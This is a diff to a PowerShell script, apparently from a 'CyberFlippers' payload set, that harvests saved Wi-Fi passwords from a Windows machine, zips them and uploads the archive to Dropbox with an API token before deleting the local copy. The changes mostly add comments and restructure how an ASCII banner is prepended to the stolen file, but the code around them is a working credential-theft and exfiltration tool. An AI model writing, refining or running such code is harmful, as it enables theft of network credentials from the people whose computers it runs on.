@@ -9,6 +9,7 @@ function DropBox-Upload {
         [Alias("f")]
         [string]$SourceFilePath
     )
+    # Prepare Dropbox API parameters
     $outputFile = Split-Path $SourceFilePath -leaf
     $TargetFilePath = "/$outputFile"
     $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
@@ -19,9 +20,8 @@ function DropBox-Upload {
         "Content-Type" = 'application/octet-stream'
     }
 
-    $fileContent = Get-Content -Path $SourceFilePath -Raw
-    $tempFilePath = [System.IO.Path]::GetTempFileName()
-    $combinedContent = @"
+    # Add header to the file content
+    $header = @"
 ########################################################################################################################
 #    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____                           # 
 #   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                        # 
@@ -30,12 +30,17 @@ function DropBox-Upload {
 #  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                        # 
 #   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/                          # 
  #########################################################################################################################           
-"@ + "`r`n" + $fileContent
+"@
 
+    $fileContent = Get-Content -Path $SourceFilePath -Raw
+    $combinedContent = $header + "`r`n" + $fileContent
+    $tempFilePath = [System.IO.Path]::GetTempFileName()
     Set-Content -Path $tempFilePath -Value $combinedContent
 
+    # Upload the file to Dropbox
     Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $tempFilePath -Headers $headers
 
+    # Clean up temporary file
     Remove-Item -Path $tempFilePath -Force
 }
 
@@ -58,12 +63,15 @@ function Get-WifiPasswords {
 }
 
 try {
+    # Retrieve WiFi passwords and compress them
     $zipFilePath = Get-WifiPasswords
 
+    # Upload to Dropbox if token is provided
     if (-not ([string]::IsNullOrEmpty($db))) {
         DropBox-Upload -f $zipFilePath
     }
 
+    # Clean up the zip file
     Remove-Item -Path $zipFilePath -Force
 }
 catch {
